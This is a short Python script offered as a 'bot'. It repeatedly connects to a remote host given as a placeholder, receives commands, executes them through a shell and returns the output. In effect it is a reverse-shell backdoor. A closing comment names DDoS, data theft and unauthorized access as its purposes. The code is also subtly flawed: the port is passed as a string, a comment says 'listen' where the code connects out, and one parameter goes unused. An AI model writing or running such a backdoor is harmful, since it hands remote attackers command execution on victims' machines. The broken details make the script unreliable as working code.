import os
import socket
import subprocess

def JohnnyDeep_bot(command, host, port):
    while True:
        # Create a socket object
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        
        # Connect to the remote host
        s.connect((host, port))
        
        # Receive data from the remote host
        data = s.recv(1024)
        
        # Execute the received command
        output = subprocess.run(data.decode(), shell=True, capture_output=True)
        
        # Send the output back to the remote host
        s.send(output.stdout)
        
        # Close the connection
        s.close()


# Replace 8000 with the port number to listen on
JohnnyDeep_bot('', '_YOUR_TARGET_IP', '_TARGET_PORT(INTEGER)')

#Remember, z bots can be used for various purposes, such as DDoS attacks, data theft, and unauthorized access to systems. They should be used with caution and only for authorized purposes.